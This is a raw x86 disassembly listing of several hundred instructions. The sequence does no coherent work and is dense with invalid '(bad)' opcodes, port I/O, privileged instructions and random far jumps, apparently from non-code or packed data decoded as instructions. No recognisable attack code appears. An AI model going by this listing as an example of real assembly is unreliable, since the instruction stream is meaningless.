  40eaf6:	or     esi,DWORD PTR [edx+0x775ae25d]
  40eafc:	jmp    0x94f2:0x9e40371
  40eb03:	or     ch,al
  40eb05:	repnz test DWORD PTR ds:[edi+0x78848f2b],edi
  40eb0d:	bound  edi,QWORD PTR [ebp+0x77]
  40eb10:	or     BYTE PTR [esi+0x47],dh
  40eb13:	push   ebx
  40eb14:	xchg   esp,eax
  40eb15:	repnz outs dx,DWORD PTR ds:[esi]
  40eb17:	xor    ah,bh
  40eb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb1a:	arpl   di,cx
  40eb1c:	shr    BYTE PTR [ecx+0x1b2d7bba],0x55
  40eb23:	jge    0x40ead8
  40eb25:	popf   
  40eb26:	call   0x4d8ff39a
  40eb2b:	ret    
  40eb2c:	call   0xef8636a
  40eb31:	in     eax,0x32
  40eb33:	jmp    0x3ff7:0x2e7193fa
  40eb3a:	sub    al,0x7d
  40eb3c:	push   0x990e87c4
  40eb41:	xchg   ebp,eax
  40eb42:	enter  0x79c3,0xe7
  40eb46:	push   esi
  40eb47:	sub    DWORD PTR [ecx+0x3c],esp
  40eb4a:	sub    eax,0x59682741
  40eb4f:	pop    ss
  40eb50:	inc    esp
  40eb51:	fild   WORD PTR [ebx+0x2c04b2b7]
  40eb57:	pop    edi
  40eb58:	(bad)  
  40eb59:	outs   dx,BYTE PTR ds:[esi]
  40eb5a:	push   ds
  40eb5b:	pop    eax
  40eb5c:	gs aaa 
  40eb5e:	pushf  
  40eb5f:	paddq  mm0,QWORD PTR [ebp+esi*4+0x2e37837d]
  40eb67:	jae    0x40ebd5
  40eb69:	cmp    al,BYTE PTR [ebx+0x58]
  40eb6c:	repnz and al,0xc2
  40eb6f:	shl    DWORD PTR [edx+esi*8-0x7b],0xe0
  40eb74:	stc    
  40eb75:	jbe    0x40eb7b
  40eb77:	mov    ebx,0xeeebf239
  40eb7c:	fs rcl BYTE PTR ss:[ebx],0x2e
  40eb81:	jae    0x40eb91
  40eb83:	sub    al,0x73
  40eb85:	add    al,BYTE PTR [ebp-0x5e]
  40eb88:	mov    eax,ds:0x25390f0e
  40eb8d:	rol    BYTE PTR [ecx+0x42],cl
  40eb90:	sbb    esp,DWORD PTR [edi]
  40eb92:	xor    ebx,esi
  40eb94:	mov    bh,0x4d
  40eb96:	dec    edi
  40eb97:	sub    al,0xcb
  40eb99:	out    dx,eax
  40eb9a:	push   esp
  40eb9b:	jg     0x40eb4a
  40eb9d:	in     eax,dx
  40eb9e:	jo     0x40ebe8
  40eba0:	add    esi,DWORD PTR [edx+0x18f2236a]
  40eba6:	ret    
  40eba7:	pop    esi
  40eba8:	fild   DWORD PTR [ecx]
  40ebaa:	es cld 
  40ebac:	xor    eax,ebp
  40ebae:	iret   
  40ebaf:	mov    eax,ds:0x212aeeb1
  40ebb4:	jl     0x40ebbd
  40ebb6:	or     esp,eax
  40ebb8:	es jbe 0x40eb9d
  40ebbb:	push   ebp
  40ebbc:	dec    eax
  40ebbd:	pop    es
  40ebbe:	jecxz  0x40ebf0
  40ebc0:	mov    dl,0x57
  40ebc3:	addr16 sub dh,dh
  40ebc6:	push   0xc8b181e4
  40ebcb:	jl     0x40ec13
  40ebcd:	nop
  40ebce:	mov    esi,0xf808f5c0
  40ebd3:	cmp    al,ch
  40ebd5:	xor    eax,0x48ac2af9
  40ebda:	ins    DWORD PTR es:[edi],dx
  40ebdb:	push   ss
  40ebdc:	shl    BYTE PTR [ebp-0x282b416b],cl
  40ebe2:	retf   
  40ebe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe4:	test   al,0x4e
  40ebe6:	pop    edi
  40ebe7:	lea    edi,[edx]
  40ebe9:	push   esi
  40ebea:	mov    esi,0xcec8c538
  40ebef:	outs   dx,DWORD PTR ds:[esi]
  40ebf0:	imul   eax,DWORD PTR ds:[edi],0xffffffbf
  40ebf4:	inc    esp
  40ebf5:	xchg   ebp,eax
  40ebf6:	ins    DWORD PTR es:[edi],dx
  40ebf7:	or     DWORD PTR [esi+0x45],0x838703b6
  40ebfe:	int    0x79
  40ec00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec01:	(bad)  
  40ec02:	(bad)  
  40ec03:	dec    eax
  40ec04:	push   esi
  40ec05:	push   ebx
  40ec06:	or     DWORD PTR [ebx+0x49],ecx
  40ec09:	das    
  40ec0a:	dec    ebp
  40ec0b:	mov    ah,0xd4
  40ec0d:	shl    BYTE PTR [ecx],0x45
  40ec10:	cmp    ax,0x9e46
  40ec14:	sub    al,0x1e
  40ec16:	inc    esi
  40ec17:	mov    al,0xf0
  40ec19:	dec    ecx
  40ec1a:	mov    al,ds:0x99c64add
  40ec1f:	ja     0x40ebf7
  40ec21:	xchg   ebp,eax
  40ec22:	mov    esi,0x51325457
  40ec27:	cld    
  40ec28:	xor    ebp,eax
  40ec2a:	or     eax,0x34ab4a99
  40ec2f:	mov    eax,0xa99aa5af
  40ec34:	test   BYTE PTR [edi+0xc],bh
  40ec37:	xor    DWORD PTR [esi+0x4242ed23],edx
  40ec3d:	sub    BYTE PTR [esi+0x5ec5c034],ch
  40ec43:	stos   DWORD PTR es:[edi],eax
  40ec44:	mov    esp,0x880d2fba
  40ec49:	jge    0x40ec58
  40ec4b:	mov    ebx,0x3aecf7e6
  40ec50:	push   eax
  40ec51:	mov    cs,WORD PTR [edx]
  40ec53:	adc    esp,DWORD PTR [ebp-0x24414088]
  40ec59:	mov    dh,BYTE PTR [edi+0x1a43e929]
  40ec5f:	cmp    BYTE PTR [bp-0x6d],bh
  40ec63:	imul   ebx,edx,0xffffffb4
  40ec66:	jp     0x40ecd6
  40ec68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec69:	out    0x7c,al
  40ec6b:	mov    al,0x9a
  40ec6d:	push   edx
  40ec6e:	and    al,0xdd
  40ec70:	push   eax
  40ec71:	(bad)  
  40ec72:	bound  eax,QWORD PTR [edi+0x11]
  40ec75:	dec    ecx
  40ec76:	ror    BYTE PTR [eax-0x582b0e4],0x89
  40ec7d:	(bad)  
  40ec7f:	int3   
  40ec80:	in     al,dx
  40ec81:	add    eax,0x73a7174e
  40ec86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec87:	dec    ecx
  40ec88:	sti    
  40ec89:	mov    esi,0xef217d83
  40ec8e:	lsl    ebx,WORD PTR [ebx+0x56]
  40ec92:	neg    BYTE PTR [ecx-0x7006ace4]
  40ec98:	adc    DWORD PTR [ebx+0x76e44fd4],edi
  40ec9e:	push   ds
  40ec9f:	pop    ds
  40eca0:	sub    DWORD PTR [esi+eax*4],ebx
  40eca3:	cmp    BYTE PTR [ebx+0x3ea330f6],cl
  40eca9:	mov    al,0x42
  40ecab:	push   0x493e9bb3
  40ecb0:	pushf  
  40ecb1:	loopne 0x40ed31
  40ecb3:	fwait
  40ecb4:	sbb    al,0x16
  40ecb6:	leave  
  40ecb7:	lahf   
  40ecb8:	rcr    BYTE PTR [ebx],1
  40ecba:	(bad)  fs:[ecx-0x56]
  40ecbe:	mov    ebp,0x7ff3eab1
  40ecc3:	lods   eax,DWORD PTR ds:[esi]
  40ecc4:	and    DWORD PTR [edi],esp
  40ecc6:	out    dx,eax
  40ecc7:	outs   dx,DWORD PTR ds:[esi]
  40ecc8:	adc    al,0xb1
  40ecca:	inc    esi
  40eccb:	push   edi
  40eccc:	jl     0x40ec96
  40ecce:	(bad)  
  40eccf:	mov    al,0x63
  40ecd1:	push   es
  40ecd2:	cmp    al,0xb9
  40ecd4:	cmp    al,bl
  40ecd6:	ins    BYTE PTR es:[edi],dx
  40ecd7:	pop    esi
  40ecd8:	push   esi
  40ecd9:	pop    ecx
  40ecda:	fild   WORD PTR [edx*1+0x592b088f]
  40ece1:	mov    dh,0x56
  40ece3:	hlt    
  40ece4:	(bad)  
  40ece5:	mov    esi,0x3b23203a
  40ecea:	mov    edx,0x4413b239
  40ecef:	popf   
  40ecf0:	and    eax,0x6aaf51fe
  40ecf5:	dec    ebx
  40ecf6:	and    al,0x44
  40ecf8:	mov    ebx,0xe17b9b8e
  40ecfd:	inc    edx
  40ecfe:	adc    dl,BYTE PTR [edi-0x4216d969]
  40ed04:	dec    ebp
  40ed05:	adc    al,0x99
  40ed07:	push   ss
  40ed08:	mov    al,0xfc
  40ed0a:	rol    BYTE PTR [eax+0x6f4ea5c7],1
  40ed10:	fisubr DWORD PTR [ebp+0x249072ca]
  40ed16:	test   eax,0x7478fc7b
  40ed1b:	push   esp
  40ed1c:	jle    0x40ecef
  40ed1e:	pop    esi
  40ed1f:	in     eax,0x88
  40ed21:	loope  0x40ed59
  40ed23:	aam    0x24
  40ed25:	(bad)  
  40ed26:	out    dx,eax
  40ed27:	mul    BYTE PTR [ecx]
  40ed29:	add    al,0xb9
  40ed2b:	idiv   DWORD PTR [ebx+0x4]
  40ed2e:	and    eax,0x8202f41b
  40ed33:	sti    
  40ed34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed35:	mov    eax,0x57fe0b25
  40ed3a:	push   0xde979101
  40ed3f:	stc    
  40ed40:	mov    esi,0x261f52ce
  40ed45:	push   ebx
  40ed46:	sub    cl,bl
  40ed48:	cmp    bh,BYTE PTR [edi]
  40ed4a:	mov    cl,0x9a
  40ed4c:	pop    eax
  40ed4d:	jp     0x40ed57
  40ed4f:	jb     0x40ecfa
  40ed51:	shr    BYTE PTR [eax],1
  40ed53:	inc    ecx
  40ed54:	sub    al,0x92
  40ed56:	jno    0x40ed72
  40ed58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed59:	jg     0x40edab
  40ed5b:	aad    0xc9
  40ed5d:	fmul   QWORD PTR [edx+0x4]
  40ed60:	int    0xa8
  40ed62:	cwde   
  40ed63:	xchg   esp,eax
  40ed64:	in     eax,0x52
  40ed66:	adc    al,0xd3
  40ed68:	call   0xd45754d3
  40ed6d:	mov    cl,0x67
  40ed6f:	rol    DWORD PTR [esi-0x1f],0x56
  40ed73:	push   eax
  40ed74:	push   esp
  40ed75:	in     eax,dx
  40ed76:	push   eax
  40ed77:	inc    ecx
  40ed79:	aaa    
  40ed7a:	mov    al,0x49
  40ed7c:	(bad)  
  40ed7d:	repz sub DWORD PTR [ebx],esi
  40ed80:	ss out 0x4,al
  40ed83:	dec    edi
  40ed84:	sub    dh,BYTE PTR [esi+0x41]
  40ed87:	hlt    
  40ed88:	imul   esp,DWORD PTR [ebp-0x54c1ff65],0x64dc8ad6
  40ed92:	iret   
  40ed93:	sbb    esp,DWORD PTR [eax+esi*8]
  40ed96:	out    0x57,al
  40ed98:	outs   dx,DWORD PTR ds:[esi]
  40ed99:	mov    ds:0x87da87ef,al
  40ed9e:	mov    eax,ds:0x98a8a928
  40eda3:	call   0x3b1f47bc
  40eda8:	ss pop esp
  40edaa:	daa    
  40edab:	bswap  edi
  40edad:	dec    edx
  40edae:	fsubp  st(3),st
  40edb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edb1:	inc    esi
  40edb2:	push   esp
  40edb3:	pop    ebx
  40edb4:	les    ebx,FWORD PTR [ebx+0x73306bd]
  40edba:	and    bl,ah
  40edbc:	mov    ebx,0x660122c1
  40edc1:	cmp    BYTE PTR [eax+0x6a877b66],dl
  40edc7:	mov    edi,0xdd320756
  40edcc:	jae    0x40edf1
  40edce:	mov    ds:0xb8867589,al
  40edd3:	fld    QWORD PTR [esi+0x42190363]
  40edd9:	mov    esp,0xbea9c9f6
  40edde:	add    DWORD PTR [ebx],esp
  40ede0:	adc    BYTE PTR [ebp+0x57a628ab],cl
  40ede6:	mov    ebp,0x4a710411
  40edeb:	push   0x736fba05
  40edf0:	and    BYTE PTR [esp+eax*8+0x64e0b2e4],0x3b
  40edf8:	push   ecx
  40edf9:	mov    ch,0xb4
  40edfb:	xor    eax,0x2a44131
  40ee00:	je     0x40edd1
  40ee02:	jge    0x40eda6
  40ee04:	add    cl,ah
  40ee06:	popf   
  40ee07:	cmp    BYTE PTR [ebx+0x4851937d],ch
  40ee0d:	stos   BYTE PTR es:[edi],al
  40ee0e:	dec    edx
  40ee0f:	cmp    al,BYTE PTR [edi+ebx*8+0x193a294c]
  40ee16:	gs dec ecx
  40ee18:	push   edi
  40ee19:	sbb    BYTE PTR [esi],0x95
  40ee1c:	jge    0x40edc0
  40ee1e:	cmp    ecx,esp
  40ee20:	adc    DWORD PTR [ecx],ebp
  40ee22:	mov    al,ds:0x267df629
  40ee27:	lods   eax,DWORD PTR ds:[esi]
  40ee28:	lea    edi,[edi-0x22]
  40ee2b:	and    cl,cl
  40ee2d:	xchg   esp,eax
  40ee2e:	ja     0x40edba
  40ee30:	cdq    
  40ee31:	jo     0x40edbb
  40ee33:	dec    ebp
  40ee34:	sbb    eax,0x19cccd1e
  40ee39:	mov    bh,0x4b
  40ee3b:	jns    0x40ee30
  40ee3d:	ins    DWORD PTR es:[edi],dx
  40ee3e:	adc    cl,BYTE PTR [ecx-0xc]
  40ee41:	add    al,0x12
  40ee43:	inc    ebx
  40ee44:	sub    al,0x8f
  40ee46:	sbb    bh,BYTE PTR [ebp+0x237e96a8]
  40ee4c:	dec    edi
  40ee4d:	inc    ecx
  40ee4e:	sub    al,0x71
  40ee50:	pusha  
  40ee51:	sar    BYTE PTR [ecx-0x34],1
  40ee54:	(bad)  [ecx+edx*2+0x32]
  40ee58:	mov    ebx,DWORD PTR [eax+0xf]
  40ee5b:	jb     0x40ee72
  40ee5d:	add    edi,DWORD PTR [esi]
  40ee5f:	push   ds
  40ee60:	js     0x40eeb9
  40ee62:	jno    0x40eeb2
  40ee64:	aam    0xbd
  40ee66:	gs adc eax,0x4d3efb85
  40ee6c:	int    0xc3
  40ee6e:	sti    
  40ee6f:	mov    bl,0xf9
  40ee71:	cdq    
  40ee72:	xchg   esp,eax
  40ee73:	ins    BYTE PTR es:[edi],dx
  40ee74:	push   esi
  40ee75:	add    DWORD PTR [esi-0x7a64c865],0x42
  40ee7c:	dec    edi
  40ee7d:	fimul  DWORD PTR [ecx]
  40ee7f:	mul    ch
  40ee81:	jno    0x40ee49
  40ee83:	add    eax,0x58e65e94
  40ee88:	ja     0x40eea0
  40ee8a:	enter  0xcee3,0x54
  40ee8e:	push   esi
  40ee8f:	mov    bh,ah
  40ee91:	call   DWORD PTR [esi]
  40ee93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee94:	fimul  WORD PTR [ecx-0x5d098db5]
  40ee9a:	cmp    DWORD PTR [esp],0x44a3500e
  40eea1:	push   ecx
  40eea2:	xchg   ebx,eax
  40eea3:	jno    0x40ee53
  40eea5:	pop    edi
  40eea6:	sub    BYTE PTR [esi+0x64160c58],0x8c
  40eead:	out    dx,eax
  40eeae:	mov    edx,0xcbc0bb90
  40eeb3:	or     al,0x58
  40eeb5:	sbb    BYTE PTR [edx+0x76],bh
  40eeb8:	mov    edx,gs
  40eeba:	arpl   WORD PTR [ebx+0x7c0f8e4b],bp
  40eec0:	xchg   esi,eax
  40eec1:	repnz std 
  40eec3:	fbld   TBYTE PTR [ebp-0x24d8e3f3]
  40eec9:	jl     0x40ee57
  40eecb:	(bad)  
  40eecc:	ficomp WORD PTR [ebx-0x46a52997]
  40eed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eed3:	dec    ebx
  40eed4:	push   0xfffffffb
  40eed6:	enter  0x48d3,0xfe
  40eeda:	dec    eax
  40eedb:	lea    edx,[ebx]
  40eedd:	and    DWORD PTR [ecx+0x1be6386b],eax
  40eee3:	retf   
  40eee4:	shl    DWORD PTR [ebp+eiz*4+0x4c09983f],0x28
  40eeec:	xlat   BYTE PTR ds:[ebx]
  40eeed:	fdivr  QWORD PTR [eax+edx*8]
  40eef0:	pop    edx
  40eef1:	add    eax,0xd5247c0e
  40eef6:	test   DWORD PTR [ecx],ebp
  40eef8:	lds    ebp,FWORD PTR [eax+0x5a2a9eb9]
  40eefe:	mov    bh,0x69
  40ef00:	xchg   DWORD PTR [ecx+ecx*1+0x2383a196],ebx
  40ef07:	jbe    0x40ef14
  40ef09:	jle    0x40eed2
  40ef0b:	(bad)  
  40ef0c:	test   dx,0x1b87
  40ef11:	out    0x8f,al
  40ef13:	jle    0x40ef3b
  40ef15:	cmp    eax,0xee1a0d39
  40ef1a:	repnz sub DWORD PTR [ecx+0x52],0x16
  40ef1f:	stos   DWORD PTR es:[edi],eax
  40ef20:	pop    esi
  40ef21:	popa   
  40ef22:	jge    0x40ef89
  40ef24:	xchg   esi,eax
  40ef25:	add    ebx,DWORD PTR [esi]
  40ef27:	xchg   edi,eax
  40ef28:	mov    ebx,0xa36b1e5b
  40ef2d:	xchg   DWORD PTR [edx],eax
  40ef2f:	xor    BYTE PTR [edi-0x4477d376],dl
  40ef35:	jbe    0x40ef28
  40ef37:	dec    ebx
  40ef38:	ja     0x40ef61
  40ef3a:	cmp    DWORD PTR [ebx-0x58],edi
  40ef3d:	into   
  40ef3e:	xor    dh,BYTE PTR [esi]
  40ef40:	and    BYTE PTR [esi+0x64c0e10b],bl
  40ef46:	inc    edx
  40ef47:	sub    esp,esi
  40ef49:	adc    esp,0x23ffa592
  40ef4f:	sbb    DWORD PTR [edi],esi
  40ef51:	xor    DWORD PTR [edx-0x3237ce36],ecx
  40ef57:	mov    esi,0xc37475fb
  40ef5c:	je     0x40ef86
  40ef5e:	cdq    
  40ef5f:	sub    al,0xf4
  40ef61:	ss pop ds
  40ef63:	cmp    bh,BYTE PTR [edx-0x18]
  40ef66:	out    0x48,eax
  40ef68:	pusha  
  40ef69:	(bad)  
  40ef6a:	loope  0x40ef6e
  40ef6c:	adc    ebp,DWORD PTR [edi-0x23]
  40ef6f:	sub    al,0xfc
  40ef71:	cmp    eax,0x8dc57811
  40ef76:	inc    edi
  40ef77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef78:	mov    ah,0x46
  40ef7a:	xchg   edx,eax
  40ef7b:	dec    edi
  40ef7c:	ror    BYTE PTR [esi-0x2445df1a],cl
  40ef82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef83:	pop    eax
  40ef84:	and    eax,0xa8ec52dc
  40ef89:	cmc    
  40ef8a:	ss or  eax,0xee623bf6
  40ef90:	shl    DWORD PTR [edi+0x4a],1
  40ef93:	push   ebx
  40ef94:	stos   DWORD PTR es:[edi],eax
  40ef95:	(bad)  
  40ef97:	pop    edx
  40ef98:	fisttp WORD PTR [edi]
  40ef9a:	pop    es
  40ef9b:	popa   
  40ef9c:	(bad)  
  40ef9d:	mov    edx,0xf19d686a
  40efa2:	shl    BYTE PTR gs:[edi-0x33],1
  40efa6:	icebp  
  40efa7:	fs xchg edi,eax
  40efa9:	(bad)  
  40efaa:	bound  eax,QWORD PTR [ecx+0x7f17dab7]
  40efb0:	aam    0x99
  40efb2:	dec    ecx
  40efb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb4:	jmp    0x40ef50
  40efb6:	sbb    edi,DWORD PTR [ebx+0x6d59e8de]
  40efbc:	sub    BYTE PTR [edi],ch
  40efbe:	aad    0x4d
  40efc0:	push   ds
  40efc1:	sbb    al,0x9e
  40efc3:	scas   al,BYTE PTR es:[edi]
  40efc4:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40efc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efc7:	jne    0x40f017
  40efc9:	jno    0x40f03b
  40efcb:	sbb    BYTE PTR [edx+0x14214b83],0x5a
  40efd2:	sbb    eax,0x673d5912
  40efd7:	dec    DWORD PTR es:[ecx*2-0x1094e600]
  40efdf:	inc    edi
  40efe0:	call   FWORD PTR [esi]
  40efe2:	fild   QWORD PTR [eax-0x66]
  40efe5:	repnz (bad) 
  40efe7:	cmp    al,0x3b
  40efe9:	adc    edi,ebx
  40efeb:	test   BYTE PTR [ebx+0x50],dl
  40efee:	shl    DWORD PTR [edx-0x5d1aceb9],0x6f
  40eff5:	stos   BYTE PTR es:[edi],al
  40eff6:	aam    0x4c
  40eff8:	cdq    
  40eff9:	cs iret 
  40effb:	imul   eax,DWORD PTR [ecx-0x34645d30],0x7ced7bb2
  40f005:	pushf  
  40f006:	adc    DWORD PTR [edi+0x32],ecx
  40f009:	stc    
  40f00a:	mov    ds:0x3e32572d,eax
  40f00f:	pop    ebp
  40f010:	jge    0x40efbb
  40f012:	enter  0x587a,0xe2
  40f016:	shl    BYTE PTR [ebp+0x7a5a364f],cl
  40f01c:	xchg   ecx,edx
  40f01e:	out    dx,eax
  40f01f:	outs   dx,DWORD PTR ds:[esi]
  40f020:	sub    eax,0xe8118faa
  40f025:	es mov cl,0x29
  40f028:	lock pushf 
  40f02a:	fldenv [edi+0x60]
  40f02d:	imul   esi,DWORD PTR [ecx*2-0x22e3e8ad],0xb519dd56
  40f038:	shl    DWORD PTR [edi],0xc2
  40f03b:	mov    es,WORD PTR [ebp-0x62107ea]
  40f041:	nop
  40f042:	imul   esp,DWORD PTR ds:0x95d8bc3a,0x3
  40f049:	mov    ebp,0xafb3a77f
  40f04e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f04f:	jg     0x40f0ca
  40f051:	mov    dl,0x5a
  40f053:	mov    edx,0x190e4bbe
  40f058:	jae    0x40f0b6
  40f05a:	push   0x38
  40f05c:	push   cs
  40f05d:	xor    esi,DWORD PTR [esp+ebx*1+0x36]
  40f061:	fstp   DWORD PTR [ecx+0x501f584f]
  40f067:	adc    BYTE PTR [edi+0x49233deb],0xcc
  40f06e:	jns    0x40f032
  40f070:	mov    dl,0xac
  40f072:	sbb    BYTE PTR [edx],ah
  40f074:	test   DWORD PTR [ecx-0x48d14e26],0xe84c7c35
  40f07e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f07f:	sbb    esp,DWORD PTR [edi+0x786354ca]
  40f085:	sub    ch,BYTE PTR [ebp+0x7a]
  40f088:	cmp    DWORD PTR [eax-0xb],esi
  40f08b:	rcl    DWORD PTR [esi],cl
  40f08d:	and    al,0x16
  40f08f:	inc    edi
  40f090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f091:	jmp    0x40f064
  40f093:	les    esi,FWORD PTR [edx]
  40f095:	and    bl,BYTE PTR [eax+0x18c4a34f]
  40f09b:	std    
  40f09c:	xor    al,0x87
  40f09e:	mov    esp,0x33c5f7e0
  40f0a3:	jb     0x40f0fa
  40f0a5:	sti    
  40f0a6:	pop    ss
  40f0a7:	mov    bl,0xc9
  40f0a9:	push   0xd254612e
  40f0ae:	nop
  40f0af:	lods   eax,DWORD PTR ds:[esi]
  40f0b0:	nop
  40f0b1:	daa    
  40f0b2:	and    eax,0x60a0fa3f
  40f0b7:	aad    0xf
  40f0b9:	sahf   
  40f0ba:	inc    ecx
  40f0bb:	pop    eax
  40f0bc:	jno    0x40f0f9
  40f0be:	adc    edi,esi
  40f0c0:	outs   dx,BYTE PTR ds:[esi]
  40f0c1:	loopne 0x40f094
  40f0c3:	scas   al,BYTE PTR es:[edi]
  40f0c4:	adc    dl,cl
  40f0c6:	clc    
  40f0c7:	cmp    eax,0x4e019c44
  40f0cc:	dec    esp
  40f0cd:	div    BYTE PTR [edi]
  40f0cf:	mov    ecx,0xe49a05d
  40f0d4:	retf   0x7f33
  40f0d7:	pop    ss
  40f0d8:	out    dx,al
  40f0d9:	jge    0x40f080
  40f0db:	push   ecx
  40f0dc:	sub    DWORD PTR [ebx+edi*8-0x4a],edi
  40f0e0:	mov    ah,0xf0
  40f0e2:	bound  edx,QWORD PTR [edx+0x28004b2f]
  40f0e8:	hlt    
  40f0e9:	out    dx,eax
  40f0ea:	jmp    0x19be57ec
  40f0ef:	inc    esi
  40f0f0:	sti    
  40f0f1:	sbb    DWORD PTR [edi],eax
  40f0f3:	inc    ecx
  40f0f4:	ds jmp 0x8940e440
  40f0fa:	or     BYTE PTR [ebp-0x39],ah
  40f0fd:	repnz mov al,ds:0x1dbab2a9
  40f103:	cmp    ch,BYTE PTR [edx]
  40f105:	in     al,dx
  40f106:	push   ebx
  40f107:	xor    ebp,DWORD PTR [esp+ecx*8+0x3c]
  40f10b:	shl    BYTE PTR [eax+eiz*4-0x77722167],cl
  40f112:	jecxz  0x40f145
  40f114:	or     ebx,DWORD PTR [edx]
  40f116:	lahf   
  40f117:	aad    0x48
  40f119:	mov    esp,0x7c8cb27a
  40f11e:	ins    BYTE PTR es:[edi],dx
  40f11f:	xor    ebx,DWORD PTR ds:0x952ff208
  40f125:	jl     0x40f0a7
  40f127:	xlat   BYTE PTR ds:[ebx]
  40f128:	push   0x37
  40f12a:	push   ds
  40f12b:	mov    DWORD PTR [ecx+0x36],ebp
  40f12e:	push   eax
  40f12f:	out    0x54,eax
  40f131:	out    0x5,al
  40f133:	fwait
  40f134:	lods   eax,DWORD PTR ds:[esi]
  40f135:	cli    
  40f136:	in     al,dx
  40f137:	xchg   ecx,eax
  40f138:	cmp    al,0xf9
  40f13a:	xchg   ebx,eax
  40f13b:	pop    ebx
  40f13c:	fwait
  40f13d:	out    0xbe,eax
  40f13f:	outs   dx,DWORD PTR ds:[esi]
  40f140:	test   DWORD PTR [ebx+0x14a48bfb],eax
  40f146:	jle    0x40f0da
  40f148:	inc    ebp
  40f149:	adc    BYTE PTR [esi-0x220508a0],0xa3
  40f150:	lock push ebp
  40f152:	adc    DWORD PTR [ebx+esi*4+0x62716317],eax
  40f159:	mov    ecx,0x46ee6412
  40f15e:	mov    al,ds:0x4b8f94b1
  40f163:	test   BYTE PTR [eax+0x370747da],ch
  40f169:	pop    edi
  40f16a:	push   ebp
  40f16b:	cwde   
  40f16c:	cmp    eax,0x3e59470
  40f171:	sar    bl,1
  40f173:	fdivr  QWORD PTR [ecx]
  40f175:	std    
  40f176:	sbb    DWORD PTR [edi-0x7f50555d],edx
  40f17c:	pop    eax
  40f17d:	mov    ebp,DWORD PTR [ebp-0x63e72191]
  40f183:	pop    ecx
  40f184:	gs sub ebp,edx
  40f187:	imul   ebx,DWORD PTR [edi+edx*1],0x6b564184
  40f18e:	hlt    
  40f18f:	popf   
  40f190:	cmp    esp,ecx
  40f192:	es xchg ecx,eax
  40f194:	dec    eax
  40f195:	mov    al,ds:0x8beb055e
  40f19a:	icebp  
  40f19b:	push   ebx
  40f19c:	icebp  
  40f19d:	inc    ecx
  40f19e:	xchg   esi,eax
  40f19f:	cmp    eax,0xd1aeb80b
  40f1a4:	out    dx,eax
  40f1a5:	addr16 test eax,0x1d791943
  40f1ab:	and    DWORD PTR [esi-0x6],esp
  40f1ae:	test   DWORD PTR [eax],ebx
  40f1b0:	and    al,0x81
  40f1b2:	ficom  DWORD PTR [ecx-0x3]
  40f1b5:	arpl   si,bx
  40f1b7:	outs   dx,BYTE PTR ds:[esi]
  40f1b8:	int3   
  40f1b9:	test   bl,ch
  40f1bb:	scas   al,BYTE PTR es:[edi]
  40f1bc:	(bad)  
  40f1bd:	jb     0x40f144
  40f1bf:	inc    eax
  40f1c0:	jp     0x40f1e2
  40f1c2:	xor    bh,BYTE PTR [ebp+ebx*2+0x25]
  40f1c6:	mov    al,ds:0xe5b600f
  40f1cb:	retf   0x1b39
  40f1ce:	push   edi
  40f1cf:	and    al,0xb3
  40f1d1:	fwait
  40f1d2:	(bad)  
  40f1d3:	(bad)  
  40f1d5:	pop    ds
  40f1d6:	inc    esp
  40f1d7:	mov    ecx,0x658d1db3
  40f1dc:	cmp    esp,eax
  40f1de:	xchg   edi,eax
  40f1df:	mov    BYTE PTR [edi],cl
  40f1e1:	jno    0x40f256
  40f1e3:	dec    eax
  40f1e4:	outs   dx,DWORD PTR ds:[esi]
  40f1e5:	pop    edi
  40f1e6:	in     al,dx
  40f1e7:	mov    DWORD PTR [esi+0x4a],ecx
  40f1ea:	scas   eax,DWORD PTR es:[edi]
  40f1eb:	repnz pop esi
  40f1ed:	mov    eax,ds:0x120ab91
  40f1f2:	mov    sp,0xc0b9
  40f1f6:	adc    DWORD PTR [eax+0x4d],ebx
  40f1f9:	jl     0x40f203
  40f1fb:	xchg   ebp,eax
  40f1fc:	push   ebp
  40f1fd:	std    
  40f1fe:	scas   al,BYTE PTR es:[edi]
  40f1ff:	or     al,0xb4
  40f201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f202:	sahf   
  40f203:	dec    esi
  40f204:	retf   0xde68
  40f207:	add    DWORD PTR ds:[edi],ecx
  40f20a:	jne    0x40f259
  40f20c:	mov    bh,0x5
  40f20e:	jbe    0x40f1e0
  40f210:	mov    edx,fs
  40f212:	xor    BYTE PTR [edi],bl
  40f214:	cmp    cl,BYTE PTR [ecx]
  40f216:	inc    edx
  40f217:	jno    0x40f270
  40f219:	fistp  QWORD PTR ss:[ecx+esi*2+0x2fb34b1]
  40f221:	sahf   
  40f222:	push   ss
  40f223:	mov    cl,0x34
  40f225:	test   eax,0xc11f16b3
  40f22a:	out    dx,al
  40f22b:	dec    ecx
  40f22c:	cmc    
  40f22d:	call   0x29c1:0x3675ccef
  40f234:	outs   dx,DWORD PTR es:[esi]
  40f236:	in     al,dx
  40f237:	sbb    eax,0xb233e805
  40f23c:	push   0x7e
  40f23e:	dec    ebx
  40f23f:	and    BYTE PTR [ebx-0x6],ch
  40f242:	push   0x15
  40f244:	sbb    al,0xb5
  40f246:	sbb    BYTE PTR [eax],0x2b
  40f249:	rep stos DWORD PTR es:[edi],eax
  40f24b:	icebp  
  40f24c:	inc    esp
  40f24d:	ja     0x40f28d
  40f24f:	add    BYTE PTR ds:0x12e7cdd4,0xa7
  40f256:	(bad)  
  40f257:	push   ecx
  40f258:	neg    BYTE PTR [eax-0x6f]
